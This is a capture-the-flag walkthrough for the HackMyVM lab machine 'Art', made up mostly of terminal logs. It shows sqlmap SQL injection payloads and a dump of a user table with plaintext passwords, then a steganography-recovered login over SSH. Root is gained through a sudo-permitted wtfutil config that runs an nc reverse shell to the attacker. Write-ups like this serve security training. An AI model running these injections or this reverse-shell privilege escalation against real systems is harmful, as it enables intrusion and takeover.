<h1 align="center"> Art-HMV: <a href="https://hackmyvm.eu/machines/machine.php?vm=Art">Art</a></h1/>


## Net Discover & NMAP
First thinks first

 ```bash
┌──(coolatos㉿CooLaToS)-[~/HMV/Art]
└─$ sudo netdiscover -r 10.1.1.1/24 -i eth0 

 Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                                                                                              
                                                                                                                                                                                                                                            
 2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 120                                                                                                                                                                            
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 10.1.1.1        08:00:27:12:9a:21      1      60  PCS Systemtechnik GmbH                                                                                                                                                                   
 10.1.1.35       08:00:27:11:b1:f5      1      60  PCS Systemtechnik GmbH  
 ```
 ```bash
 ┌──(coolatos㉿CooLaToS)-[~/HMV/Art]
└─$ ip=10.1.1.35 && url=http://$ip                                                                                                                         
                                                                                  
┌──(coolatos㉿CooLaToS)-[~/HMV/Ripper]
└─$ nmap -v -T5 -p- -sC -sV -oN nmap-$ip.log $ip; clear; cat nmap-$ip.log
# Nmap 7.92 scan initiated Mon Aug 22 15:25:06 2022 as: nmap -v -T5 -p- -sC -sV -oN nmap-10.1.1.35.log 10.1.1.35
Nmap scan report for 10.1.1.35
Host is up (0.00026s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 45:42:0f:13:cc:8e:49:dd:ec:f5:bb:0f:58:f4:ef:47 (RSA)
|   256 12:2f:a3:63:c2:73:99:e3:f8:67:57:ab:29:52:aa:06 (ECDSA)
|_  256 f8:79:7a:b1:a8:7e:e9:97:25:c3:40:4a:0c:2f:5e:69 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Aug 22 15:25:16 2022 -- 1 IP address (1 host up) scanned in 9.20 seconds

 ```
## Visiting the website 
```bash
 ┌──(coolatos㉿CooLaToS)-[~/HMV/Ripper]
└─$ firefox $ip
```
Nothing special found on the website After checking the source code we found 

  ```terminal
  SEE HMV GALLERY!
<br>
 <img src=abc321.jpg><br><img src=jlk19990.jpg><br><img src=ertye.jpg><br><img src=zzxxccvv3.jpg><br>
<!-- Need to solve tag parameter problem. -->
```
## Feroxbuster
 ```bash
┌──(coolatos㉿CooLaToS)-[~/HMV/Art]
└─$ feroxbuster -e -x txt,php,html,zip,htm,bak,pem -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u $url -t 500 -o ferox-$ip.log

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.1.1.35
 🚀  Threads               │ 500
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ ferox-10.1.1.35.log
 💲  Extensions            │ [txt, php, html, zip, htm, bak, pem]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET    14758l    82642w  3171502c http://10.1.1.35/abc321.jpg
200      GET        4l       17w        0c http://10.1.1.35/index.php
200      GET    13623l    72384w  2989800c http://10.1.1.35/jlk19990.jpg
200      GET    11659l    67120w  2732227c http://10.1.1.35/zzxxccvv3.jpg
200      GET    20309l   114665w  4712929c http://10.1.1.35/ertye.jpg
200      GET        4l       17w        0c http://10.1.1.35/
[>-------------------] - 3s     11774/3528800 18m     found:6       errors:0      
[>-------------------] - 3s      4000/1764368 1418/s  http://10.1.1.35 
[>-------------------] - 3s      4000/1764368 1368/s  http://10.1.1.35/ 

```
The only php we found is the index lets compine it with this tag and see what we might get.
http://10.1.1.35/index.php?tag=

## Burp
Fireup burp sent the get through burp and save it
```bash 
┌──(coolatos㉿CooLaToS)-[~/HMV/Art]
└─$ cat get.txt             
<?xml version="1.0"?>
<!DOCTYPE items [
<!ELEMENT items (item*)>
<!ATTLIST items burpVersion CDATA "">
<!ATTLIST items exportTime CDATA "">
<!ELEMENT item (time, url, host, port, protocol, method, path, extension, request, status, responselength, mimetype, response, comment)>
<!ELEMENT time (#PCDATA)>
<!ELEMENT url (#PCDATA)>
<!ELEMENT host (#PCDATA)>
<!ATTLIST host ip CDATA "">
<!ELEMENT port (#PCDATA)>
<!ELEMENT protocol (#PCDATA)>
<!ELEMENT method (#PCDATA)>
<!ELEMENT path (#PCDATA)>
<!ELEMENT extension (#PCDATA)>
<!ELEMENT request (#PCDATA)>
<!ATTLIST request base64 (true|false) "false">
<!ELEMENT status (#PCDATA)>
<!ELEMENT responselength (#PCDATA)>
<!ELEMENT mimetype (#PCDATA)>
<!ELEMENT response (#PCDATA)>
<!ATTLIST response base64 (true|false) "false">
<!ELEMENT comment (#PCDATA)>
]>
<items burpVersion="2022.7.1" exportTime="Mon Aug 22 15:22:26 EEST 2022">
  <item>
    <time>Mon Aug 22 15:22:10 EEST 2022</time>
    <url><![CDATA[http://10.1.1.35/index.php?tag=]]></url>
    <host ip="10.1.1.35">10.1.1.35</host>
    <port>80</port>
    <protocol>http</protocol>
    <method><![CDATA[GET]]></method>
    <path><![CDATA[/index.php?tag=]]></path>
    <extension>php</extension>
    <request base64="true"><![CDATA[R0VUIC9pbmRleC5waHA/dGFnPSBIVFRQLzEuMQ0KSG9zdDogMTAuMS4xLjM1DQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQ7IHJ2OjkxLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvOTEuMA0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLCovKjtxPTAuOA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpDb25uZWN0aW9uOiBjbG9zZQ0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KDQo=]]></request>
    <status></status>
    <responselength></responselength>
    <mimetype></mimetype>
    <response base64="true"></response>
    <comment></comment>
  </item>
</items>
```
## SQLMAP
 ```bash
┌──(coolatos㉿CooLaToS)-[~/HMV/Art]
└─$ sqlmap -r get.txt  --threads 10 --dbs --level 5 --risk 3 --random-agent
        ___
       __H__                                                                                                                                                                                                                                 
 ___ ___[']_____ ___ ___  {1.6.7#stable}                                                                                                                                                                                                     
|_ -| . [(]     | .'| . |                                                                                                                                                                                                                    
|___|_  [,]_|_|_|__,|  _|                                                                                                                                                                                                                    
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                 

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:30:46 /2022-08-22/

[15:30:46] [INFO] parsing HTTP request from 'get.txt'
[15:30:46] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.19) Gecko/2010091807 Firefox/3.0.6 (Debian-3.0.6-3)' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[15:30:46] [WARNING] provided value for parameter 'tag' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[15:30:46] [INFO] resuming back-end DBMS 'mysql' 
[15:30:46] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: tag (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: tag=-2798' OR 5460=5460-- GprG

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: tag=' AND (SELECT 1284 FROM (SELECT(SLEEP(5)))Xuuk)-- NWOe

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: tag=' UNION ALL SELECT NULL,CONCAT(0x7171627671,0x74614c6a6c4f544176745a6e446b70484145717a4f724a526c6141446373775350416d6c4c69486e,0x71627a7871),NULL-- -
---
[15:30:46] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[15:30:46] [INFO] fetching database names
available databases [2]:
[*] gallery
[*] information_schema

[15:30:46] [INFO] fetched data logged to text files under '/home/coolatos/.local/share/sqlmap/output/10.1.1.35'

[*] ending @ 15:30:46 /2022-08-22/
```
```bash
┌──(coolatos㉿CooLaToS)-[~/HMV/Art]
└─$ sqlmap -r get.txt  --threads 10 --dbs --level 5 --risk 3 --random-agent --dump

        ___
       __H__                                                                                                                                                                                                                                 
 ___ ___[,]_____ ___ ___  {1.6.7#stable}                                                                                                                                                                                                     
|_ -| . [)]     | .'| . |                                                                                                                                                                                                                    
|___|_  [)]_|_|_|__,|  _|                                                                                                                                                                                                                    
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                 

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:31:24 /2022-08-22/

[15:31:24] [INFO] parsing HTTP request from 'get.txt'
[15:31:24] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN; rv:1.9.2.14) Gecko/20110218 Firefox/3.6.14' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[15:31:24] [WARNING] provided value for parameter 'tag' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[15:31:24] [INFO] resuming back-end DBMS 'mysql' 
[15:31:24] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: tag (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: tag=-2798' OR 5460=5460-- GprG

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: tag=' AND (SELECT 1284 FROM (SELECT(SLEEP(5)))Xuuk)-- NWOe

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: tag=' UNION ALL SELECT NULL,CONCAT(0x7171627671,0x74614c6a6c4f544176745a6e446b70484145717a4f724a526c6141446373775350416d6c4c69486e,0x71627a7871),NULL-- -
---
[15:31:24] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[15:31:24] [INFO] fetching database names
available databases [2]:
[*] gallery
[*] information_schema

[15:31:24] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[15:31:24] [INFO] fetching current database
[15:31:24] [INFO] fetching tables for database: 'gallery'
[15:31:24] [INFO] fetching columns for table 'users' in database 'gallery'
[15:31:24] [INFO] fetching entries for table 'users' in database 'gallery'
Database: gallery
Table: users
[8 entries]
+----+-----------------+--------+
| id | pass            | user   |
+----+-----------------+--------+
| 1  | realpazz        | mina   |
| 2  | mncxzKLLJDS     | me     |
| 3  | 987dsKLDSOIU    | lula   |
| 4  | BDSAOIUYEW      | notme  |
| 5  | dsOIUSDAOydsa   | mona   |
| 6  | EWQUDSAdaSDSA=  | admin  |
| 7  | VCXddsaEWQdsa_D | lila   |
| 8  | DSAewqDSAewq    | root   |
+----+-----------------+--------+

[15:31:24] [INFO] table 'gallery.users' dumped to CSV file '/home/coolatos/.local/share/sqlmap/output/10.1.1.35/dump/gallery/users.csv'
[15:31:24] [INFO] fetching columns for table 'art' in database 'gallery'
[15:31:24] [INFO] fetching entries for table 'art' in database 'gallery'
Database: gallery
Table: art
[5 entries]
+----+-----------+---------------+
| id | tag       | image         |
+----+-----------+---------------+
| 1  | beautiful | abc321.jpg    |
| 2  | beautiful | jlk19990.jpg  |
| 3  | beautiful | ertye.jpg     |
| 4  | beautiful | zzxxccvv3.jpg |
| 5  | beauty    | dsa32.jpg     |
+----+-----------+---------------+

[15:31:24] [INFO] table 'gallery.art' dumped to CSV file '/home/coolatos/.local/share/sqlmap/output/10.1.1.35/dump/gallery/art.csv'
[15:31:24] [INFO] fetched data logged to text files under '/home/coolatos/.local/share/sqlmap/output/10.1.1.35'

[*] ending @ 15:31:24 /2022-08-22/
```
## STEGSEEK
```terminal
Database: gallery
Table: art
[5 entries]
+----+-----------+---------------+
| id | tag       | image         |
+----+-----------+---------------+
| 1  | beautiful | abc321.jpg    |
| 2  | beautiful | jlk19990.jpg  |
| 3  | beautiful | ertye.jpg     |
| 4  | beautiful | zzxxccvv3.jpg |
| 5  | beauty    | dsa32.jpg     |
+----+-----------+---------------+
```
Checking each image we only got from dsa32 ( which is the only one with different tag )

```bash
┌──(coolatos㉿CooLaToS)-[~/HMV/Art]
└─$ stegseek dsa32.jpg             
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: ""
[i] Original filename: "yes.txt".
[i] Extracting to "dsa32.jpg.out".

                                                                                                                                                                                                                                             
┌──(coolatos㉿CooLaToS)-[~/HMV/Art]
└─$ cat dsa32.jpg.out
lion/s*********u
```
 ## SSH
```bash
┌──(coolatos㉿CooLaToS)-[~/HMV/Art]
└─$ ssh lion@$ip
lion@10.1.1.35's password: 
Linux art 5.10.0-16-amd64 #1 SMP Debian 5.10.127-2 (2022-07-23) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Aug 22 14:36:54 2022 from 10.1.1.2
lion@art:~$ ls
user.txt
 ```
 ## USERFLAG Found. Lets try for ROOTFLAG
 ```bash
lion@art:~$ sudo -l
Matching Defaults entries for lion on art:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User lion may run the following commands on art:
    (ALL : ALL) NOPASSWD: /bin/wtfutil
```
After some searching about that wtfutil we can see that we can execute command.
When we run the wtfutil we see that its running through /root/.config/wtf/config.yml which we dont have access.
So we need to create our own yml
## Exploiting
```bash
lion@art:/tmp$ cat config.yml 
wtf:
  grid:
    columns: [40, 40]
    rows: [4, 4]
  refreshInterval: 1
  mods:
    disks:
      type: cmdrunner
      cmd: "nc"
      args: ["-e", "/bin/bash", "10.1.1.2", "8888"]
      enabled: true
      position:
        top: 3
        left: 1
        height: 1
        width: 3
      refreshInterval: 3
```
Setup our listener
```bash
┌──(coolatos㉿CooLaToS)-[~]
└─$ nc -nlvp 8888                                                                                                                                                                                                                        1 ⨯
listening on [any] 8888 ...
```
```bash
lion@art:/tmp$ sudo /bin/wtfutil --config=/tmp/config.yml
```
```bash
┌──(coolatos㉿CooLaToS)-[~]
└─$ nc -nlvp 8888                                                                                                                                                                                                                        1 ⨯
listening on [any] 8888 ...
connect to [10.1.1.2] from (UNKNOWN) [10.1.1.35] 39804
id
uid=0(root) gid=0(root) grupos=0(root)
pwd
/tmp
cd /root
ls
pwd
/root
```
we need to search for the root flag.
## Rootflag
```bash
find / -name root.txt 2>/dev/null
/var/opt/root.txt
```
